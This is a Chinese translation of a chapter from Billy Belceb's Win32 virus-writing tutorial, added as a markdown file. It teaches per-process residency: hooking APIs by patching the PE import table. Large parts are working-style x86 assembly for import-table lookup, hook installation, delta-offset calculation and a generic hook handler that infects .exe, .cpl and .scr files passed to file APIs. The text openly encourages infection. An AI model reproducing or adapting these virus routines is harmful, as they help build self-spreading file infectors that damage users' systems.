@@ -1,0 +1,377 @@
+
+
+# Billy Belceb 病毒编写教程 for Win32 
+
+> 原文：[`www.pediy.com/kssd/pediy06/pediy65787.htm`](https://www.pediy.com/kssd/pediy06/pediy65787.htm)
+
+【每一线程驻留(Per-Process residency)】  
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~      
+    一个用来讨论的非常有意思的话题:Per-Process residency，对所有的 Win32 平台都适用的一种方法。我已经把这一章从 Ring-3 那一章分离开来是因为我想它是一中进化，对于初学 Ring-3 来说也是稍微复杂了些。  
+  
+%介绍%  
+\~~~~~~  
+    per-process residence 首先由 29A 的 Jacky Qwerty 在 1997 年编写的。此外(对媒体来说，不是真正的-Win32.Jacky)它是第一个 Win32 病毒，它还是第一个 Win32 驻留病毒，使用从没见过的技术:per-process residence。那么你想知道"什么是 per-process residence 呢?"。我已经在 DDT#1 的一篇文章中解释了那个了，但是这里我将对这个方法作一个更深的分析。首先，你必须知道什么是 Win32，和它的 PE 可执行文件是怎么工作的。当你调用一个 API 的时候，你将要调用一个由系统在运行期把 Import Table(输入表)保存到内存的地址，这个输入表指向 API 在 DLL 中的入口点。为了作一个 per-process 驻留，你将要不得不对输入表做些手脚，并修改你想要钩住并指向你自己的代码的 API 地址值，这个代码能够处理指定的 API，也就是说由 API 来处理感染文件。我知道这有一点点杂乱，但是正如在病毒代码编写的每一件事情中，开始总是看起来很难的，但是后面就非常简单了:)  
+  
+ --\[DDT#1.2\_4\]---------------------------------------------------------------  
+  
+   恩，这个可能是我知道的编写 Win32 驻留病毒的唯一的已知途径。是的，你已经看到的是 Win32 而不是 Win9X。这是因为这个方法还能够运行在 WinNT 下面。首先，你必须知道什么是一个进程。这个东西更使我奇怪的是那些开始在 Windows 下编程的人知道这个方法之后，并知道这个是个什么样的方法，但是他们通常不知道这个名字。好了，当我们执行一个 Windows 应用程序的时候，那就是一个进程:)非常容易理解。而这个驻留方式做了什么呢?首先我们必须开辟一块内存，为了把病毒主体放在那里，但是这个内存是从我们正在执行的自己的进程开始的。所以，我们开辟一些系统给这个进程的内存。它将由使用 API 函数"VirtualAlloc"来完成。但是...怎样来钩住 API 呢？现在据我所知最常用的方法是改变 API 在输入表(import table)中的地址。这是我的观点，唯一可行的方法。因为输入表可以被写，这就更简单了，而且我们不需要任何 VxDCALL0 的函数的帮助...  
+  
+   但是，这种类型的驻留病毒的弱点也在这里了...正如我们在输入表里所看到的，感染率严重依赖于我们要感染的文件。例如，如果我们感染 WinNT 的 CMD.EXE，并且我有一个 FindFirstFile(A/W)和 FindNextFile(A/W)的感染例程，使用那些 API 的的所有文件都被感染。这就使得我们的病毒非常具有感染性，主要是因为当我们在 WinNT 下使用一个 DIR 命令的时候将会频繁使用。总之，如果我们不使用其它的方法来使它更具感染性的话，Per-Process 方法将是非常脆弱的，如在 Win32.Cabanas 中，一个运行部分中。我们使得运行期部分每次感染\\WINDOWS 和\\WINDOWS\\SYSTEM 目录下的一些文件。另外一个好的选择是，正如我在用 CMD 为例的例子里所说的，直接碰那些在第一次感染一个系统里的非常特别的文件...  
+  
+ --\[DDT#1.2\_4\]---------------------------------------------------------------  
+  
+   我已经在 1998 年的 12 月份把它写出来了，虽然我发现它可以不通过开辟内存来实现，但是，我还是改了它使之更容易理解。  
+  
+%输入表处理%  
+\~~~~~~~~~~~~  
+   下面使输入表的结构。  
+  
+ IMAGE\_IMPORT\_DESCRIPTOR  
+ ^^^^^^^^^^^^^^^^^^^^^^^  
+ -----------------------------------<----+00000000h  
+|         Characteristics           |      Size : 1 DWORD  
+ -----------------------------------<----+00000004h  
+|         Time Date Stamp           |      Size : 1 DWORD  
+ -----------------------------------<----+00000008h  
+|         Forwarder Chain           |      Size : 1 DWORD  
+ -----------------------------------<----+0000000Ch  
+|         Pointer to Name           |      Size : 1 DWORD  
+ -----------------------------------<----+00000010h  
+|           First Thunk             |      Size : 1 DWORD  
+ -----------------------------------  
+  
+    现在让我们看看 Matt Pietrek 是怎么描述它的。  
+  
+ DWORD   Characteristics  
+  
+    曾经，这个被看成一些标志。然而，微软改变了它的意思并不厌其烦地更新 WINNT.H。这个域世界上是指向一个指针数组的偏移(一个 RVA)。这些指针每个都指向一个 IMAGE\_IMPORT\_BY\_NAME 结构。  
+  
+ DWORD   TimeDateStamp  
+  
+    time/date 标志表明文件是什么时候建立的。  
+  
+ DWORD   ForwarderChain  
+  
+    这个域和向前调用有关。向前调用包括在一个 DLL 中把它的一个函数发送引用到另外一个 DLL。例如，在 Windows NT 中，NTDLL.DLL 看起来有一些函数向前调用 KERNEL32.DLL 中的一些函数。一个应用程序可能会认为它在调用 NTDLL.DLL 中的一个函数，但是世界上最终调用 KERNEL32.DLL 中的函数。这个域包含了一个对 FirstThunk 数组(即将要描述)的索引。这个由这个域索引的函数将要向前调用到另外一个 DLL 中。不幸的是，这种函数是怎么向前调用的格式没有文档资料，而且向前调用的函数的例子很难找。  
+  
+ DWORD   Name  
+  
+    这是一个以 NULL 结尾的包含输入的 DLL 的名字 ASCII 字符串的 RVA。一般的例子是"KERNEL32.DLL" 和 "USER32.DLL"。  
+  
+ PIMAGE\_THUNK\_DATA FirstThunk  
+  
+    这个域是一个指向 IMAGE\_THUNK\_DATA 单元的偏移地址(一个 RVA)。在几乎每种情况下，这个单元被理解成一个 IMAGE\_IMPORT\_BY\_NAME 结构的指针。如果这个域不是这些指针的其中一个，那么它可能被认为是被输入的 DLL 的序数。资料中关于你是否真的可以通过序数而不是通过名字来输入一个函数并不很确切。一个 IMAGE\_IMPORT\_DESCRIPTOR 的重要的部分是输入的 DLL 名字和两个 IMAGE\_IMPORT\_BY\_NAME 数组。在 EXE 文件中，这两个数组(指向 Characteristics  和 FirstThunk 域)是平行的，而且在每个数组的结尾是空指针。两个数组里的指针都指向一个 IMAGE\_IMPORT\_BY\_NAME 结构。  
+  
+    现在正如你所知道的 Matt Pietrek(G0D)的定义，我将在这里列出从输入表里获取 API 地址和到 API(我们将要改变的，后面关于这个更多)的偏移地址的代码。  
+  
+;--------从这里开始剪切-------------------------------------------------------  
+;  
+; GetAPI\_IT 函数  
+; ==============  
+; 下面的代码能够从输入表(Import Table)中获取一些信息  
+;  
+ GetAPI\_IT      proc  
+  
+ ;-----------------------------------------------------------------------------  
+ ; Ok, 让我们摇摇头。这个函数需要的参数和返回如下:  
+ ;   
+ ; 输入 : EDI : 指向 API 名字的指针 (区分大小写)  
+ ; 输出 : EAX : API 地址  
+ ;        EBX : API 地址在输入表(import table)中地址  
+ ;-----------------------------------------------------------------------------  
+  
+        mov     dword ptr \[ebp+TempGA\_IT1\],edi  ; Save ptr to name  
+        mov     ebx,edi                           
+        xor     al,al                           ; Search for "\\0"  
+        scasb  
+        jnz     $-1  
+        sub     edi,ebx                         ; Obtain size of name  
+        mov     dword ptr \[ebp+TempGA\_IT2\],edi  ; Save size of name  
+  
+ ;-----------------------------------------------------------------------------  
+ ;我们首先保存指向 API 的指针到一个临时变量中，然后我们搜索那个字符串的结尾，由  
+ ;0 标记的，然后我们把 EDI 的新值(指向 0)它的旧值，这样就得到了 API 名字的大小。很  
+ ;迷人，不是吗?在这之后，我们把 API 名字的大小保存到另外一个临时变量中。  
+ ;-----------------------------------------------------------------------------  
+  
+        xor     eax,eax                         ; Make zero EAX  
+        mov     esi,dword ptr \[ebp+imagebase\]   ; Load process imagebase  
+        add     esi,3Ch                         ; Pointer to offset 3Ch  
+        lodsw                                   ; Get process PE header  
+        add     eax,dword ptr \[ebp+imagebase\]   ; address (normalized!)  
+        xchg    esi,eax  
+        lodsd  
+  
+        cmp     eax,"EP"                        ; Is it really a PE?  
+        jnz     nopes                           ; Shit!  
+  
+        add     esi,7Ch  
+        lodsd                                   ; Get address  
+        push    eax  
+        lodsd                                   ; EAX = Size  
+        pop     esi  
+        add     esi,dword ptr \[ebp+imagebase\]  
+  
+ ;-----------------------------------------------------------------------------  
+ ;我们要做的第一件事是清空 EAX，因为我们不要它的 MSW。然后，我们要做的是在我们  
+ ;主体的头部检查 PE 签名。如果所有的事情都做好了，我们得到一个指向 Import Table   
+ ;section (.idata)的指针。  
+ ;-----------------------------------------------------------------------------  
+  
+ SearchK32:  
+        push    esi  
+        mov     esi,\[esi+0Ch\]                   ; ESI = Pointer to name  
+        add     esi,dword ptr \[ebp+imagebase\]   ; Normalize  
+        lea     edi,\[ebp+K32\_DLL\]               ; Ptr to "KERNEL32.dll",0  
+        mov     ecx,K32\_Size                    ; ECX = Size of above string  
+        cld                                     ; Clear Direction Flag  
+        push    ecx                             ; Save size for later  
+        rep     cmpsb                           ; Compare bytes  
+        pop     ecx                             ; Restore size  
+        pop     esi                             ; Restore ptr to import  
+        jz      gotcha                          ; If matched, jump  
+        add     esi,14h                         ; Get another field  
+        jmp     SearchK32                       ; Loop again  
+  
+ ;-----------------------------------------------------------------------------  
+ ;首先我们再次把 ESI 压栈，我们将需要它被保存，因为正如你所知道的，它是.idata 节  
+ ;的开始。然后，我们在 ESI 中得到的是名字的 ASCII 字符串(指针)的 RVA，然后，我们把  
+ ;它用基址把那个值标准化，  
+ ;-----------------------------------------------------------------------------  
+  
+ gotcha:  
+        cmp     byte ptr \[esi\],00h              ; Is OriginalFirstThunk 0?  
+        jz      nopes                           ; Fuck off if it is.  
+        mov     edx,\[esi+10h\]                   ; Get FirstThunk :)  
+        add     edx,dword ptr \[ebp+imagebase\]   ; Normalize!  
+        lodsd  
+        or      eax,eax                         ; Is it 0?   
+        jz      nopes                           ; Shit...  
+  
+        xchg    edx,eax                         ; Get pointer to it!  
+        add     edx,\[ebp+imagebase\]  
+        xor     ebx,ebx  
+  
+ ;-----------------------------------------------------------------------------  
+ ; 首先，我们检查 OriginalFirstThunk 域是否为 NULL，如果它是，我们以一个错误退出。  
+ ; 然后，我们得到 FirstThunk 值，并通过加上基址(imagebase)来标准化它，并检查它  
+ ; 是否是 0(如果它是，我们就有一个问题了，因此我们退出)。之后，我们把那个地址  
+ ; (FirshtThunk)放到 EDX 中，并标准化，在 EAX 中我们保存的是指向 FirstThunk 域的  
+ ; 指针。  
+ ;-----------------------------------------------------------------------------  
+  
+ loopy:  
+        cmp     dword ptr \[edx\],00h             ; Last RVA? Duh...  
+        jz      nopes  
+        cmp     byte ptr \[edx+03h\],80h          ; Ordinal? Duh...  
+        jz      reloop  
+          
+        mov     edi,dword ptr \[ebp+TempGA\_IT1\]  ; Get pointer to API name  
+        mov     ecx,dword ptr \[ebp+TempGA\_IT2\]  ; Get API name size  
+        mov     esi,\[edx\]                       ; We retrieve the current  
+        add     esi,dword ptr \[ebp+imagebase\]   ; pointed imported api string  
+        inc     esi  
+        inc     esi  
+        push    ecx                             ; Save its size  
+        rep     cmpsb                           ; Compare both stringz  
+        pop     ecx                             ; Restore it  
+        jz      wegotit  
+ reloop:  
+        inc     ebx                             ; Increase counter  
+        add     edx,4                           ; Get another ptr to another  
+        loop    loopy                           ; imported API and loop  
+  
+ ;-----------------------------------------------------------------------------   
+ ; 首先，我们检查是否在数组(以 null 字符标记)的最后，如果是，我们离开。然后，我们  
+ ; 检查它是是否是一个序数，如果是，我们得到另外一个。接下来是有趣的东东:我们把  
+ ; 我们以前保存的指向要搜索的 API 名字的指针保存到 EDI 中，在 ECX 中是那个字符串的长  
+ ; 度，并把指向输入表中的当前的 API 的指针保存到 ESI 中。我们对这两个字符串进行比较  
+ ; 如果它们不相等，我们重新得到另外一个，直到我们找到了它或者我们到达输入表的  
+ ; 最后一个 API。  
+ ;-----------------------------------------------------------------------------  
+  
+ wegotit:  
+        shl     ebx,2                           ; Multiply per 4 (dword size)  
+        add     ebx,eax                         ; Add to FirstThunk value  
+        mov     eax,\[ebx\]                       ; EAX = API address ;)  
+        test    al,0                            ; This is for avoid a jump,  
+        org     $-1                             ; thus optimizing a little :)  
+ nopes:  
+        stc                                     ; Error!  
+        ret  
+  
+ ;-----------------------------------------------------------------------------  
+ ; 非常简单：因为我们在 EBX 中的是计数，而且数组是一个 DWORD 数组，我们把它乘以 4  
+ ; (为了得到和标志 API 地址的 FirstThunk 相关的偏移)，然后我们在 EBX 中的是指向想要得到  
+ ; 的 API 在输入表中的地址的指针。非常完美:)  
+ ;-----------------------------------------------------------------------------  
+  
+ GetAPI\_IT      endp  
+  
+;-------到这里为止剪切---------------------------------------------------------  
+  
+    OK，现在我们知道怎么样来玩输入表。但是我们需要更多的东西!  
+  
+%运行期获取基址(imagebase)%  
+\~~~~~~~~~~~~~~~~~~~~~~~~~~~  
+    一个最普遍的错误是认为 imagebase 总是一个常量，或者它将总是为 400000h。但是这和事实相去甚远。无论你在文件头里得到的是什么  
+imagebase，它可以被系统在运行期很容易地改变，所以我们将要访问一个不正确地地址，而且我们将会得到无法预料地回应。而获取它地方法是非常简单地。简单地使用通常的 delta-offset 例程。  
+  
+ virus\_start:  
+        call    tier                            ; Push in ESP return address  
+ tier:  pop     ebp                             ; Get that ret address  
+        sub     ebp,offset realcode             ; And sub initial offset  
+  
+    OK?举个例子，让我们想象一下执行从 401000h 开始(几乎所有的由 TLINK 链接的文件)。所以，当我们使用了 POP，我们将在 EBP 中得到诸如  
+00401005 的结果。所以把它减去 tier-virus\_start，并减去当前的 EIP(也就是说在所有的 TLINK 连接的文件中为 1000h)？是的你得到了 imagebase!所以将会如下：  
+  
+ virus\_start:  
+        call    tier                            ; Push in ESP return address  
+ tier:  pop     ebp                             ; Get that ret address  
+        mov     eax,ebp  
+        sub     ebp,offset realcode             ; And sub initial offset  
+        sub     eax,00001000h                   ; Sub current EIP (should be  
+ NewEIP equ     $-4                             ; patched at infection time)  
+        sub     eax,(tier-virus\_start)          ; Sub some shit :)  
+  
+    不要忘记在感染期修复 NewEIP 变量(如果你修改了 EIP)，所以它总是和 PE 文件头偏移 28h 处的值相等，也就是程序的 EIP 的 RVA:)  
+  
+ \[ 我的 API 钩子 \]  
+  
+    下面是我的 GetAPI\_IT 例程的普查。这个基于如下的一个结构:  
+  
+        db      ASCIIz\_API\_Name  
+        dd      offset (API\_Handler)  
+  
+     例如：  
+  
+        db      "CreateFileA",0  
+        dd      offset HookCreateFileA  
+  
+     而 HookCreateFileA 是一个处理钩住了的函数的例程。我使用这个结构的代码如下：  
+  
+;---------从这里开始剪切-------------------------------------------------------------  
+  
+ HookAllAPIs:  
+  lea     edi,\[ebp+@@Hookz\]               ; Ptr to the first API  
+ nxtapi:  
+        push    edi                             ; Save the pointer  
+  call    GetAPI\_IT                       ; Get it from Import Table  
+        pop     edi                             ; Restore the pointer  
+  jc      Next\_IT\_Struc\_                  ; Fail? Damn...  
+                                                ; EAX = API Address  
+                                                ; EBX = Pointer to API Address  
+                                                ; in the import table  
+  
+  xor     al,al                           ; Reach the end of API string  
+  scasb  
+  jnz     $-1  
+  
+        mov     eax,\[edi\]                       ; Get handler offset  
+        add     eax,ebp                         ; Adjust with delta offset  
+        mov     \[ebx\],eax                       ; And put it in the import!  
+ Next\_IT\_Struc:  
+        add     edi,4                           ; Get next structure item :)  
+  cmp     byte ptr \[edi\],""              ; Reach the last api? Grrr...  
+        jz      AllHooked                       ; We hooked all, pal  
+        jmp     nxtapi                          ; Loop again  
+ AllHooked:  
+  ret  
+  
+ Next\_IT\_Struc\_:  
+        xor     al,al                           ; Get the end of string  
+  scasb  
+  jnz     $-1  
+        jmp     Next\_IT\_Struc                   ; And come back :)  
+  
+ @@Hookz label   byte  
+        db      "MoveFileA",0                   ; Some example hooks  
+        dd      (offset HookMoveFileA)  
+  
+        db      "CopyFileA",0  
+        dd      (offset HookCopyFileA)  
+  
+        db      "DeleteFileA",0  
+        dd      (offset HookDeleteFileA)  
+  
+        db      "CreateFileA",0  
+        dd      (offset HookCreateFileA)  
+  
+        db      ""                             ; End of array :)  
+  
+;---------到这里为止剪切-------------------------------------------------------------  
+  
+    我希望它是高度清楚:)  
+  
+ %一般的钩子%  
+\~~~~~~~~~~~~~  
+  
+    如果你发现了，有一些 API，它的参数中，最后压栈的参数是一个指向一个存档(可以为一个可执行文件)的指针，所以我们可以 hook 它们并应用一个普通的处理首先来检测它的的扩展名，所以如果它是一个可执行文件，我们可以没有问题地感染它了:)  
+  
+;---------从这里开始剪切-------------------------------------------------------------  
+  
+ ; Some variated hooks :)  
+  
+ HookMoveFileA:  
+        call    DoHookStuff                     ; Handle this call  
+        jmp     \[eax+\_MoveFileA\]                ; Pass control 2 original API  
+  
+ HookCopyFileA:  
+        call    DoHookStuff                     ; Handle this call  
+        jmp     \[eax+\_CopyFileA\]                ; Pass control 2 original API  
+  
+ HookDeleteFileA:  
+        call    DoHookStuff                     ; Handle this call  
+        jmp     \[eax+\_DeleteFileA\]              ; Pass control 2 original API  
+  
+ HookCreateFileA:  
+        call    DoHookStuff                     ; Handle this call  
+        jmp     \[eax+\_CreateFileA\]              ; Pass control 2 original API  
+  
+ ; The generic hooker!!  
+  
+ DoHookStuff:  
+        pushad                                  ; Push all registers  
+        pushfd                                  ; Push all flags  
+        call    GetDeltaOffset                  ; Get delta offset in EBP  
+  mov     edx,\[esp+2Ch\]                   ; Get filename to infect  
+        mov     esi,edx                         ; ESI = EDX = file to check  
+ reach\_dot:  
+        lodsb                                   ; Get character  
+  or      al,al                           ; Find NULL? Shit...  
+        jz      ErrorDoHookStuff                ; Go away then  
+  cmp     al,"."                          ; Dot found? Interesting...  
+        jnz     reach\_dot                       ; If not, loop again  
+        dec     esi                             ; Fix it  
+  lodsd                                   ; Put extension in EAX  
+        or      eax,20202020h                   ; Make string lowercase  
+  cmp     eax,"exe."                      ; Is it an EXE? Infect!!!  
+        jz      InfectWithHookStuff  
+        cmp     eax,"lpc."                      ; Is it a CPL? Infect!!!  
+        jz      InfectWithHookStuff  
+        cmp     eax,"rcs."                      ; Is is a SCR? Infect!!!  
+        jnz     ErrorDoHookStuff  
+ InfectWithHookStuff:  
+        xchg    edi,edx                         ; EDI = Filename to infect  
+        call    InfectEDI                       ; Infect file!! ;)  
+ ErrorDoHookStuff:  
+  popfd                                   ; Preserve all as if nothing  
+  popad                                   ; happened :)  
+  push    ebp  
+  call    GetDeltaOffset                  ; Get delta offset   
+        xchg    eax,ebp                         ; Put delta offset in EAX  
+  pop     ebp  
+  ret  
+  
+;---------到这里为止剪切-------------------------------------------------------------  
+  
+    一些可以用这个一般的例程来 hook 的 API 如下：  
+ MoveFileA, CopyFileA, GetFullPathNameA, DeleteFileA, WinExec, CreateFileA  
+ CreateProcessA, GetFileAttributesA, SetFileAttributesA, \_lopen, MoveFileExA  
+ CopyFileExA, OpenFile。  
+  
+%最后的话%  
+\~~~~~~~~~~  
+    如果还有什么不清楚的地方，发 email 给我。我将尽可能地用一个简单的 per-process 驻留的病毒来阐述它，但是我编写的唯一一个 per-process 病毒太复杂了，而且比这有更多的特色，所以对你来说还是看不明白:)  
+
+ 4dd466d0e1e0cc123afbe504da2462ca
